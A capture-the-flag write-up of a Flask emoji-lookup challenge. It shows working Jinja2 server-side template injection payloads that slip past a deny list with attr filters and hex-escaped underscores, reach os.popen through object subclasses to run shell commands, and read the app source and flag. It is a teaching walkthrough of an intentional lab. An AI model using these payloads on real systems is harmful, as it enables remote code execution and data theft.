+++
author = "Maik de Kruif"
title = "Gatekeeper"
subtitle = "Challenge 17 - AdventOfCTF"
date = 2021-01-06T22:51:23+01:00
description = "A writeup for challenge 17 of AdventOfCTF."
cover = "img/writeups/adventofctf/2020/8717d728f2de96beb8123c0cca28a728.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "python",
    "flask",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
aliases = [
    "challenge_17"
]
+++

-   Points: 1700

## Description

Santa has launched version 2 of the Emoji finder! Some people were able to find the flag in the 1st version, that will not happen again!

Visit <https://17.adventofctf.com> to start the challenge.

## Recon

Upon opening the challenge website we're greeted with some text and an input field. The text says the following: "Santa likes emojis! Enter one to find out what it means. Try 'santa' for instance.". If we then enter 'santa' in the input field and press the search button, we get a santa emoji: 🎅.

When opening the source of the page we also find the following comment: "Here is a cheatsheet of the emojis you can use: <https://www.webfx.com/tools/emoji-cheat-sheet/>" and some javascript:

```js
function send() {
    let emoji = $("#emoji")[0].value;
    if (emoji.length > 0) {
        $.post("/", { emoji: emoji }, function (data) {
            $("#msg")[0].innerHTML = "<b>" + data + "</b>";
        });
    }
}
```

## Finding the vulnerability

The description makes a reference to [yesterday's challenge]({{% ref "writeups/adventofctf/2020/challenge_16.md" %}}) so we probably have to use the same concept.

Let's verify it by trying the following input: `{{7*7}}`. It returned `49` so we can continue with the next step.

## Exploit

Just like [yesterday's challenge]({{% ref "writeups/adventofctf/2020/challenge_16.md" %}}), we start by trying to get the config like so: `{{config.items()}}`. Sadly, we get an error message: "You entered an emoji that is on my deny list".

### Blacklist

As it turns out, this challenge has a blacklist on the input. Let's first test what is and what isn't allowed. We can do this by just trying some characters:

`{{7*7}}` -> `49`  
`{{7*'7'}}` -> deny list  
`{{7*"7"}}` -> `7777777`  
`{{7*"_"}}` -> deny list  
`{{7*"confi"}}` -> `conficonficonficonficonficonficonfi`  
`{{7*"config"}}` -> deny list  
`{{7*"."}}` -> deny list

Blacklist: `'`, `_`, `config`, `.`

### Getting the config

As "config" is blacklisted, we have to come up with another way to access it. Luckily there is a fairly straightforward way to get it as `config` is saved in `context`. And, in jinja2, `self` in a template refers to `context`. This means we can get it by reading `self.__dict__`.

We cannot do this directly however, as dots and underscores are blacklisted. Luckily, jinja2 has some [built-in filters](https://jinja.palletsprojects.com/en/master/templates/#builtin-filters) like `attr` that allow us to get attributes from a variable.

This works by piping a variable into a filter like so `{{self|attr("")}}`. This string passed to `attr` is the attribute we want. We can't just fill in `__dict__` however, because of the blacklist. But, because we pass the attribute as a string, we can use it's hexadecimal ASCII value like so: `\x5f`.

The resulting input is the following: `{{self|attr("\x5f\x5fdict\x5f\x5f")}}`.

```yml
{
    '_TemplateReference__context': <Context {
        'range': <class 'range'>,
        'dict': <class 'dict'>,
        'lipsum': <function generate_lorem_ipsum at 0x7f2a4eda4a70>,
        'cycler': <class 'jinja2.utils.Cycler'>,
        'joiner': <class 'jinja2.utils.Joiner'>,
        'namespace': <class 'jinja2.utils.Namespace'>,
        'url_for': <function url_for at 0x7f2a4dfc6ef0>,
        'get_flashed_messages': <function get_flashed_messages at 0x7f2a4dfcd0e0>,
        'config': <Config {
            'ENV': 'production',
            'DEBUG': False,
            'TESTING': False,
            'PROPAGATE_EXCEPTIONS': None,
            'PRESERVE_CONTEXT_ON_EXCEPTION': None,
            'SECRET_KEY': 'Leer alles over Software Security bij Arjen (follow @credmp) at https://www.novi.nl', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31),
            'USE_X_SENDFILE': False,
            'SERVER_NAME': None,
            'APPLICATION_ROOT': '/',
            'SESSION_COOKIE_NAME': 'session',
            'SESSION_COOKIE_DOMAIN': False,
            'SESSION_COOKIE_PATH': None,
            'SESSION_COOKIE_HTTPONLY': True,
            'SESSION_COOKIE_SECURE': False,
            'SESSION_COOKIE_SAMESITE': None,
            'SESSION_REFRESH_EACH_REQUEST': True,
            'MAX_CONTENT_LENGTH': None,
            'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200),
            'TRAP_BAD_REQUEST_ERRORS': None,
            'TRAP_HTTP_EXCEPTIONS': False,
            'EXPLAIN_TEMPLATE_LOADING': False,
            'PREFERRED_URL_SCHEME': 'http',
            'JSON_AS_ASCII': True,
            'JSON_SORT_KEYS': True,
            'JSONIFY_PRETTYPRINT_REGULAR': False,
            'JSONIFY_MIMETYPE': 'application/json',
            'TEMPLATES_AUTO_RELOAD': None,
            'MAX_COOKIE_SIZE': 4093,
            'flag': "C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F"}>,
            'request': <Request 'http://127.0.0.1:10017/' [POST]>,
            'session': <SecureCookieSession {}>,
            'g': <flask.g of 'app'>
    } of None>
}
```

_Note: be sure to use double-quotes (`"`) as the single ones are blacklisted._

Here we find an encrypted flag again: `'flag': "C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F"`

## Decrypting the flag

Just like [yesterday's challenge]({{% ref "writeups/adventofctf/2020/challenge_16.md" %}}), the flag is encrypted and we probably have to get the source again to get the key used to encrypt the flag. To get the source we first need arbitrary code execution.

### Arbitrary Code Execution (ACE)

Unfortunately, we cannot grab the `os` module using the same method as yesterday as it requirers the config class and we cannot easily get it. This means we have to find another way.

Another common trick to get the code execution is by having a look at the subclasses of the `object` class. We can get it by taking the following path: `''.__class__.__mro__[1].__subclasses__()`. This gets the class of `string`, reads it superclasses by getting `__mro__`, gets the `object` class from index `1` and then reads its superclasses by using the `__subclasses__()` method.

To get the subclasses, we first have to convert `''.__class__.__mro__[1].__subclasses__()` to an acceptable input. This becomes:

```text
{{ [""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")][0][1]|attr("\x5f\x5fsubclasses\x5f\x5f")() }}
```

After submitting this, we get the following result:

{{< collapsible-block badge="text" title="Result" >}}

```js
[
    <class 'type'>,
    <class 'weakref'>,
    <class 'weakcallableproxy'>,
    <class 'weakproxy'>,
    <class 'int'>,
    <class 'bytearray'>,
    <class 'bytes'>,
    <class 'list'>,
    <class 'NoneType'>,
    <class 'NotImplementedType'>,
    <class 'traceback'>,
    <class 'super'>,
    <class 'range'>,
    <class 'dict'>,
    <class 'dict_keys'>,
    <class 'dict_values'>,
    <class 'dict_items'>,
    <class 'odict_iterator'>,
    <class 'set'>,
    <class 'str'>,
    <class 'slice'>,
    <class 'staticmethod'>,
    <class 'complex'>,
    <class 'float'>,
    <class 'frozenset'>,
    <class 'property'>,
    <class 'managedbuffer'>,
    <class 'memoryview'>,
    <class 'tuple'>,
    <class 'enumerate'>,
    <class 'reversed'>,
    <class 'stderrprinter'>,
    <class 'code'>,
    <class 'frame'>,
    <class 'builtin_function_or_method'>,
    <class 'method'>,
    <class 'function'>,
    <class 'mappingproxy'>,
    <class 'generator'>,
    <class 'getset_descriptor'>,
    <class 'wrapper_descriptor'>,
    <class 'method-wrapper'>,
    <class 'ellipsis'>,
    <class 'member_descriptor'>,
    <class 'types.SimpleNamespace'>,
    <class 'PyCapsule'>,
    <class 'longrange_iterator'>,
    <class 'cell'>,
    <class 'instancemethod'>,
    <class 'classmethod_descriptor'>,
    <class 'method_descriptor'>,
    <class 'callable_iterator'>,
    <class 'iterator'>,
    <class 'coroutine'>,
    <class 'coroutine_wrapper'>,
    <class 'moduledef'>,
    <class 'module'>,
    <class 'EncodingMap'>,
    <class 'fieldnameiterator'>,
    <class 'formatteriterator'>,
    <class 'filter'>,
    <class 'map'>,
    <class 'zip'>,
    <class 'BaseException'>,
    <class 'hamt'>,
    <class 'hamt_array_node'>,
    <class 'hamt_bitmap_node'>,
    <class 'hamt_collision_node'>,
    <class 'keys'>,
    <class 'values'>,
    <class 'items'>,
    <class 'Context'>,
    <class 'ContextVar'>,
    <class 'Token'>,
    <class 'Token.MISSING'>,
    <class '_frozen_importlib._ModuleLock'>,
    <class '_frozen_importlib._DummyModuleLock'>,
    <class '_frozen_importlib._ModuleLockManager'>,
    <class '_frozen_importlib._installed_safely'>,
    <class '_frozen_importlib.ModuleSpec'>,
    <class '_frozen_importlib.BuiltinImporter'>,
    <class 'classmethod'>,
    <class '_frozen_importlib.FrozenImporter'>,
    <class '_frozen_importlib._ImportLockContext'>,
    <class '_thread._localdummy'>,
    <class '_thread._local'>,
    <class '_thread.lock'>,
    <class '_thread.RLock'>,
    <class 'zipimport.zipimporter'>,
    <class '_frozen_importlib_external.WindowsRegistryFinder'>,
    <class '_frozen_importlib_external._LoaderBasics'>,
    <class '_frozen_importlib_external.FileLoader'>,
    <class '_frozen_importlib_external._NamespacePath'>,
    <class '_frozen_importlib_external._NamespaceLoader'>,
    <class '_frozen_importlib_external.PathFinder'>,
    <class '_frozen_importlib_external.FileFinder'>,
    <class '_io._IOBase'>,
    <class '_io._BytesIOBuffer'>,
    <class '_io.IncrementalNewlineDecoder'>,
    <class 'posix.ScandirIterator'>,
    <class 'posix.DirEntry'>,
    <class 'codecs.Codec'>,
    <class 'codecs.IncrementalEncoder'>,
    <class 'codecs.IncrementalDecoder'>,
    <class 'codecs.StreamReaderWriter'>,
    <class 'codecs.StreamRecoder'>,
    <class '_abc_data'>,
    <class 'abc.ABC'>,
    <class 'dict_itemiterator'>,
    <class 'collections.abc.Hashable'>,
    <class 'collections.abc.Awaitable'>,
    <class 'collections.abc.AsyncIterable'>,
    <class 'async_generator'>,
    <class 'collections.abc.Iterable'>,
    <class 'bytes_iterator'>,
    <class 'bytearray_iterator'>,
    <class 'dict_keyiterator'>,
    <class 'dict_valueiterator'>,
    <class 'list_iterator'>,
    <class 'list_reverseiterator'>,
    <class 'range_iterator'>,
    <class 'set_iterator'>,
    <class 'str_iterator'>,
    <class 'tuple_iterator'>,
    <class 'collections.abc.Sized'>,
    <class 'collections.abc.Container'>,
    <class 'collections.abc.Callable'>,
    <class 'os._wrap_close'>,
    <class '_sitebuiltins.Quitter'>,
    <class '_sitebuiltins._Printer'>,
    <class '_sitebuiltins._Helper'>,
    <class 'warnings.WarningMessage'>,
    <class 'warnings.catch_warnings'>,
    <class 'types.DynamicClassAttribute'>,
    <class 'types._GeneratorWrapper'>,
    <class '_hashlib.HASH'>,
    <class '_blake2.blake2b'>,
    <class '_blake2.blake2s'>,
    <class '_sha3.sha3_224'>,
    <class '_sha3.sha3_256'>,
    <class '_sha3.sha3_384'>,
    <class '_sha3.sha3_512'>,
    <class '_sha3.shake_128'>,
    <class '_sha3.shake_256'>,
    <class 'itertools.accumulate'>,
    <class 'itertools.combinations'>,
    <class 'itertools.combinations_with_replacement'>,
    <class 'itertools.cycle'>,
    <class 'itertools.dropwhile'>,
    <class 'itertools.takewhile'>,
    <class 'itertools.islice'>,
    <class 'itertools.starmap'>,
    <class 'itertools.chain'>,
    <class 'itertools.compress'>,
    <class 'itertools.filterfalse'>,
    <class 'itertools.count'>,
    <class 'itertools.zip_longest'>,
    <class 'itertools.permutations'>,
    <class 'itertools.product'>,
    <class 'itertools.repeat'>,
    <class 'itertools.groupby'>,
    <class 'itertools._grouper'>,
    <class 'itertools._tee'>,
    <class 'itertools._tee_dataobject'>,
    <class '_random.Random'>,
    <class '_weakrefset._IterationGuard'>,
    <class '_weakrefset.WeakSet'>,
    <class 'weakref.finalize._Info'>,
    <class 'weakref.finalize'>,
    <class 'functools.partial'>,
    <class 'functools._lru_cache_wrapper'>,
    <class 'operator.itemgetter'>,
    <class 'operator.attrgetter'>,
    <class 'operator.methodcaller'>,
    <class 'reprlib.Repr'>,
    <class 'collections.deque'>,
    <class '_collections._deque_iterator'>,
    <class '_collections._deque_reverse_iterator'>,
    <class 'collections._Link'>,
    <class 'functools.partialmethod'>,
    <class 'enum.auto'>,
    <enum 'Enum'>,
    <class 're.Pattern'>,
    <class 're.Match'>,
    <class '_sre.SRE_Scanner'>,
    <class 'sre_parse.Pattern'>,
    <class 'sre_parse.SubPattern'>,
    <class 'sre_parse.Tokenizer'>,
    <class 're.Scanner'>,
    <class '_json.Scanner'>,
    <class '_json.Encoder'>,
    <class 'json.decoder.JSONDecoder'>,
    <class 'json.encoder.JSONEncoder'>,
    <class 'tokenize.Untokenizer'>,
    <class 'traceback.FrameSummary'>,
    <class 'traceback.TracebackException'>,
    <class 'threading._RLock'>,
    <class 'threading.Condition'>,
    <class 'threading.Semaphore'>,
    <class 'threading.Event'>,
    <class 'threading.Barrier'>,
    <class 'threading.Thread'>,
    <class 'Struct'>,
    <class 'unpack_iterator'>,
    <class 'pickle._Framer'>,
    <class 'pickle._Unframer'>,
    <class 'pickle._Pickler'>,
    <class 'pickle._Unpickler'>,
    <class '_pickle.Unpickler'>,
    <class '_pickle.Pickler'>,
    <class '_pickle.Pdata'>,
    <class '_pickle.PicklerMemoProxy'>,
    <class '_pickle.UnpicklerMemoProxy'>,
    <class 'urllib.parse._ResultMixinStr'>,
    <class 'urllib.parse._ResultMixinBytes'>,
    <class 'urllib.parse._NetlocResultMixinBase'>,
    <class 'jinja2.utils.MissingType'>,
    <class 'jinja2.utils.LRUCache'>,
    <class 'jinja2.utils.Cycler'>,
    <class 'jinja2.utils.Joiner'>,
    <class 'jinja2.utils.Namespace'>,
    <class 'string.Template'>,
    <class 'string.Formatter'>,
    <class 'markupsafe._MarkupEscapeHelper'>,
    <class 'jinja2.nodes.EvalContext'>,
    <class 'jinja2.nodes.Node'>,
    <class 'jinja2.runtime.TemplateReference'>,
    <class 'jinja2.runtime.Context'>,
    <class 'jinja2.runtime.BlockReference'>,
    <class 'jinja2.runtime.LoopContextBase'>,
    <class 'jinja2.runtime.LoopContextIterator'>,
    <class 'jinja2.runtime.Macro'>,
    <class 'jinja2.runtime.Undefined'>,
    <class 'decimal.Decimal'>,
    <class 'decimal.Context'>,
    <class 'decimal.SignalDictMixin'>,
    <class 'decimal.ContextManager'>,
    <class 'numbers.Number'>,
    <class '_ast.AST'>,
    <class 'jinja2.lexer.Failure'>,
    <class 'jinja2.lexer.TokenStreamIterator'>,
    <class 'jinja2.lexer.TokenStream'>,
    <class 'jinja2.lexer.Lexer'>,
    <class 'jinja2.parser.Parser'>,
    <class 'jinja2.visitor.NodeVisitor'>,
    <class 'jinja2.idtracking.Symbols'>,
    <class '__future__._Feature'>,
    <class 'jinja2.compiler.MacroRef'>,
    <class 'jinja2.compiler.Frame'>,
    <class 'jinja2.environment.Environment'>,
    <class 'jinja2.environment.Template'>,
    <class 'jinja2.environment.TemplateModule'>,
    <class 'jinja2.environment.TemplateExpression'>,
    <class 'jinja2.environment.TemplateStream'>,
    <class 'jinja2.loaders.BaseLoader'>,
    <class 'zlib.Compress'>,
    <class 'zlib.Decompress'>,
    <class '_bz2.BZ2Compressor'>,
    <class '_bz2.BZ2Decompressor'>,
    <class '_lzma.LZMACompressor'>,
    <class '_lzma.LZMADecompressor'>,
    <class 'tempfile._RandomNameSequence'>,
    <class 'tempfile._TemporaryFileCloser'>,
    <class 'tempfile._TemporaryFileWrapper'>,
    <class 'tempfile.SpooledTemporaryFile'>,
    <class 'tempfile.TemporaryDirectory'>,
    <class 'jinja2.bccache.Bucket'>,
    <class 'jinja2.bccache.BytecodeCache'>,
    <class 'logging.LogRecord'>,
    <class 'logging.PercentStyle'>,
    <class 'logging.Formatter'>,
    <class 'logging.BufferingFormatter'>,
    <class 'logging.Filter'>,
    <class 'logging.Filterer'>,
    <class 'logging.PlaceHolder'>,
    <class 'logging.Manager'>,
    <class 'logging.LoggerAdapter'>,
    <class 'concurrent.futures._base._Waiter'>,
    <class 'concurrent.futures._base._AcquireFutures'>,
    <class 'concurrent.futures._base.Future'>,
    <class 'concurrent.futures._base.Executor'>,
    <class 'select.poll'>,
    <class 'select.epoll'>,
    <class 'selectors.BaseSelector'>,
    <class '_socket.socket'>,
    <class 'subprocess.CompletedProcess'>,
    <class 'subprocess.Popen'>,
    <class '_ssl._SSLContext'>,
    <class '_ssl._SSLSocket'>,
    <class '_ssl.MemoryBIO'>,
    <class '_ssl.Session'>,
    <class 'ssl.SSLObject'>,
    <class 'dis.Bytecode'>,
    <class 'inspect.BlockFinder'>,
    <class 'inspect._void'>,
    <class 'inspect._empty'>,
    <class 'inspect.Parameter'>,
    <class 'inspect.BoundArguments'>,
    <class 'inspect.Signature'>,
    <class 'asyncio.coroutines.CoroWrapper'>,
    <class 'asyncio.events.Handle'>,
    <class 'asyncio.events.AbstractServer'>,
    <class 'asyncio.events.AbstractEventLoop'>,
    <class 'asyncio.events.AbstractEventLoopPolicy'>,
    <class '_asyncio.Future'>,
    <class '_asyncio.FutureIter'>,
    <class 'TaskStepMethWrapper'>,
    <class 'TaskWakeupMethWrapper'>,
    <class '_RunningLoopHolder'>,
    <class 'asyncio.futures.Future'>,
    <class 'asyncio.protocols.BaseProtocol'>,
    <class 'asyncio.transports.BaseTransport'>,
    <class 'asyncio.sslproto._SSLPipe'>,
    <class 'asyncio.locks._ContextManager'>,
    <class 'asyncio.locks._ContextManagerMixin'>,
    <class 'asyncio.locks.Event'>,
    <class 'asyncio.queues.Queue'>,
    <class 'asyncio.streams.StreamWriter'>,
    <class 'asyncio.streams.StreamReader'>,
    <class 'asyncio.subprocess.Process'>,
    <class 'asyncio.unix_events.AbstractChildWatcher'>,
    <class 'jinja2.asyncsupport.AsyncLoopContextIterator'>,
    <class 'datetime.date'>,
    <class 'datetime.timedelta'>,
    <class 'datetime.time'>,
    <class 'datetime.tzinfo'>,
    <class 'werkzeug._internal._Missing'>,
    <class 'werkzeug._internal._DictAccessorProperty'>,
    <class 'importlib.abc.Finder'>,
    <class 'importlib.abc.Loader'>,
    <class 'importlib.abc.ResourceReader'>,
    <class 'contextlib.ContextDecorator'>,
    <class 'contextlib._GeneratorContextManagerBase'>,
    <class 'contextlib._BaseExitStack'>,
    <class 'pkgutil.ImpImporter'>,
    <class 'pkgutil.ImpLoader'>,
    <class 'werkzeug.utils.HTMLBuilder'>,
    <class 'werkzeug.exceptions.Aborter'>,
    <class 'werkzeug.urls.Href'>,
    <class 'socketserver.BaseServer'>,
    <class 'socketserver.ForkingMixIn'>,
    <class 'socketserver.ThreadingMixIn'>,
    <class 'socketserver.BaseRequestHandler'>,
    <class 'calendar._localized_month'>,
    <class 'calendar._localized_day'>,
    <class 'calendar.Calendar'>,
    <class 'calendar.different_locale'>,
    <class 'email._parseaddr.AddrlistClass'>,
    <class 'email.charset.Charset'>,
    <class 'email.header.Header'>,
    <class 'email.header._ValueFormatter'>,
    <class 'email._policybase._PolicyBase'>,
    <class 'email.feedparser.BufferedSubFile'>,
    <class 'email.feedparser.FeedParser'>,
    <class 'email.parser.Parser'>,
    <class 'email.parser.BytesParser'>,
    <class 'email.message.Message'>,
    <class 'http.client.HTTPConnection'>,
    <class 'mimetypes.MimeTypes'>,
    <class 'click._compat._FixupStream'>,
    <class 'click._compat._AtomicFile'>,
    <class 'click.utils.LazyFile'>,
    <class 'click.utils.KeepOpenFile'>,
    <class 'click.utils.PacifyFlushWrapper'>,
    <class 'click.parser.Option'>,
    <class 'click.parser.Argument'>,
    <class 'click.parser.ParsingState'>,
    <class 'click.parser.OptionParser'>,
    <class 'click.types.ParamType'>,
    <class 'click.formatting.HelpFormatter'>,
    <class 'click.core.Context'>,
    <class 'click.core.BaseCommand'>,
    <class 'click.core.Parameter'>,
    <class 'werkzeug.serving.WSGIRequestHandler'>,
    <class 'werkzeug.serving._SSLContext'>,
    <class 'werkzeug.serving.BaseWSGIServer'>,
    <class 'werkzeug.datastructures.ImmutableListMixin'>,
    <class 'werkzeug.datastructures.ImmutableDictMixin'>,
    <class 'werkzeug.datastructures.UpdateDictMixin'>,
    <class 'werkzeug.datastructures.ViewItems'>,
    <class 'werkzeug.datastructures._omd_bucket'>,
    <class 'werkzeug.datastructures.Headers'>,
    <class 'werkzeug.datastructures.ImmutableHeadersMixin'>,
    <class 'werkzeug.datastructures.IfRange'>,
    <class 'werkzeug.datastructures.Range'>,
    <class 'werkzeug.datastructures.ContentRange'>,
    <class 'werkzeug.datastructures.FileStorage'>,
    <class 'urllib.request.Request'>,
    <class 'urllib.request.OpenerDirector'>,
    <class 'urllib.request.BaseHandler'>,
    <class 'urllib.request.HTTPPasswordMgr'>,
    <class 'urllib.request.AbstractBasicAuthHandler'>,
    <class 'urllib.request.AbstractDigestAuthHandler'>,
    <class 'urllib.request.URLopener'>,
    <class 'urllib.request.ftpwrapper'>,
    <class 'werkzeug.wrappers.accept.AcceptMixin'>,
    <class 'werkzeug.wrappers.auth.AuthorizationMixin'>,
    <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>,
    <class 'werkzeug.wsgi.ClosingIterator'>,
    <class 'werkzeug.wsgi.FileWrapper'>,
    <class 'werkzeug.wsgi._RangeWrapper'>,
    <class 'werkzeug.formparser.FormDataParser'>,
    <class 'werkzeug.formparser.MultiPartParser'>,
    <class 'werkzeug.wrappers.base_request.BaseRequest'>,
    <class 'werkzeug.wrappers.base_response.BaseResponse'>,
    <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>,
    <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>,
    <class 'werkzeug.wrappers.etag.ETagRequestMixin'>,
    <class 'werkzeug.wrappers.etag.ETagResponseMixin'>,
    <class 'werkzeug.wrappers.cors.CORSRequestMixin'>,
    <class 'werkzeug.wrappers.cors.CORSResponseMixin'>,
    <class 'werkzeug.useragents.UserAgentParser'>,
    <class 'werkzeug.useragents.UserAgent'>,
    <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>,
    <class 'werkzeug.wrappers.request.StreamOnlyMixin'>,
    <class 'werkzeug.wrappers.response.ResponseStream'>,
    <class 'werkzeug.wrappers.response.ResponseStreamMixin'>,
    <class 'http.cookiejar.Cookie'>,
    <class 'http.cookiejar.CookiePolicy'>,
    <class 'http.cookiejar.Absent'>,
    <class 'http.cookiejar.CookieJar'>,
    <class 'werkzeug.test._TestCookieHeaders'>,
    <class 'werkzeug.test._TestCookieResponse'>,
    <class 'werkzeug.test.EnvironBuilder'>,
    <class 'werkzeug.test.Client'>,
    <class 'uuid.UUID'>,
    <class 'itsdangerous._json._CompactJSON'>,
    <class 'hmac.HMAC'>,
    <class 'itsdangerous.signer.SigningAlgorithm'>,
    <class 'itsdangerous.signer.Signer'>,
    <class 'itsdangerous.serializer.Serializer'>,
    <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>,
    <class 'flask._compat._DeprecatedBool'>,
    <class 'werkzeug.local.Local'>,
    <class 'werkzeug.local.LocalStack'>,
    <class 'werkzeug.local.LocalManager'>,
    <class 'werkzeug.local.LocalProxy'>,
    <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>,
    <class 'dataclasses._MISSING_TYPE'>,
    <class 'dataclasses._FIELD_BASE'>,
    <class 'dataclasses.InitVar'>,
    <class 'dataclasses.Field'>,
    <class 'dataclasses._DataclassParams'>,
    <class 'ast.NodeVisitor'>,
    <class 'difflib.SequenceMatcher'>,
    <class 'difflib.Differ'>,
    <class 'difflib.HtmlDiff'>,
    <class 'pprint._safe_key'>,
    <class 'pprint.PrettyPrinter'>,
    <class 'werkzeug.routing.RuleFactory'>,
    <class 'werkzeug.routing.RuleTemplate'>,
    <class 'werkzeug.routing.BaseConverter'>,
    <class 'werkzeug.routing.Map'>,
    <class 'werkzeug.routing.MapAdapter'>,
    <class 'flask.signals.Namespace'>,
    <class 'flask.signals._FakeSignal'>,
    <class 'flask.helpers.locked_cached_property'>,
    <class 'flask.helpers._PackageBoundObject'>,
    <class 'flask.cli.DispatchingApp'>,
    <class 'flask.cli.ScriptInfo'>,
    <class 'flask.config.ConfigAttribute'>,
    <class 'flask.ctx._AppCtxGlobals'>,
    <class 'flask.ctx.AppContext'>,
    <class 'flask.ctx.RequestContext'>,
    <class 'flask.json.tag.JSONTag'>,
    <class 'flask.json.tag.TaggedJSONSerializer'>,
    <class 'flask.sessions.SessionInterface'>,
    <class 'werkzeug.wrappers.json._JSONModule'>,
    <class 'werkzeug.wrappers.json.JSONMixin'>,
    <class 'flask.blueprints.BlueprintSetupState'>,
    <class 'unicodedata.UCD'>,
    <class 'jinja2.ext.Extension'>,
    <class 'jinja2.ext._CommentFinder'>,
    <class 'jinja2.debug.TracebackFrameProxy'>,
    <class 'jinja2.debug.ProcessedTraceback'>,
    <class 'CArgObject'>,
    <class '_ctypes.CThunkObject'>,
    <class '_ctypes._CData'>,
    <class '_ctypes.CField'>,
    <class '_ctypes.DictRemover'>,
    <class 'ctypes.CDLL'>,
    <class 'ctypes.LibraryLoader'>
]
```

{{< /collapsible-block >}}

In this result we find the following class: `<class 'os._wrap_close'>`. This is the `os` module and it is on index `127`. We can verify it's index by getting it from the submodules list using the following input:

```text
{{ [[""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")][0][1]|attr("\x5f\x5fsubclasses\x5f\x5f")()][0][127] }}
```

This should return `<class 'os._wrap_close'>`.

### Grabbing the file

Now that we've got the `os` module, we can use it's `popen` function to execute commands. Let's try to list the work directory using the following input:

```text
{{ [[[""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")][0][1]|attr("\x5f\x5fsubclasses\x5f\x5f")()][0][127]|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")][0]["popen"]("ls -lA")|attr("read")() }}
```

It worked! We got the following result:

```text
total 28
dr-xr-xr-x    1 app      app           4096 Nov 28 14:15 __pycache__
-r--r--r--    1 app      app           1571 Nov 28 14:15 app.py
-r--r--r--    1 app      app             93 Nov 28 14:15 requirements.txt
-r-xr-xr-x    1 app      app             26 Nov 28 14:15 serve.sh
dr-xr-xr-x    1 app      app           4096 Nov 28 14:15 static
-rw-r--r--    1 root     root             2 Dec  2 13:53 supervisord.pid
dr-xr-xr-x    1 app      app           4096 Nov 28 14:15 templates
```

Now let's grab the contents of `app.py`:

```text
{{ [[[""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")][0][1]|attr("\x5f\x5fsubclasses\x5f\x5f")()][0][127]|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")][0]["popen"]("cat app\x2epy")|attr("read")() }}
```

{{< collapsible-block badge="python" title="app.py" >}}

```py
import random
from flask import Flask, render_template_string, render_template, request
import os
import emojis

app = Flask(__name__)
app.config['SECRET_KEY'] = 'Leer alles over Software Security bij Arjen (follow @credmp) at https://www.novi.nl'

def magic(flag, key):
    return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[x]) ^ ord(key[::-1][x])) for x in range(len(flag)))

file = open("/tmp/flag.txt", "r")
flag = file.read()

app.config['flag'] = magic(flag, '46e505c983433b7c8eefb953d3ffcd196a08bbf9')
flag = ""

os.remove("/tmp/flag.txt")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        emoji="unknown"
        try:
            p = request.values.get('emoji')
            if p != None:
                emoji = emojis.db.get_emoji_by_alias(p)
        except Exception as e:
            print(e)
            pass

        try:
            if emoji == None:
                if '.' in p or '_' in p or "'" in p or 'config' in p:
                    return render_template_string("You entered an emoji that is on my deny list")
                else:
                    return render_template_string("You entered an unknown emoji: %s" % p)
            else:
                return render_template_string("You entered %s which is %s. It's aliases %s" % (p, emoji.emoji, emoji.aliases))
        except Exception as e:
            print(e)
            return 'Exception'

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

{{< /collapsible-block >}}

## Magic function

Just like [yesterday]({{% ref "writeups/adventofctf/2020/challenge_16.md" %}}), we find a magic function. It looks like it's the same just with a different key so let's decrypt it using the new key (`46e505c983433b7c8eefb953d3ffcd196a08bbf9`):

```text
Python 3.6.9 (default, Nov  7 2019, 10:44:02)
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> def magic(flag, key):
...     return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))
...
>>> magic("C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F", "46e505c983433b7c8eefb953d3ffcd196
a08bbf9")
'NOVI{santa_l0ves_his_emojis}\n'
>>>
```

## Solution

We got the flag! It is `NOVI{santa_l0ves_his_emojis}`.

This flag can then be submitted for the [challenge](https://ctfd.adventofctf.com/challenges#17-18).
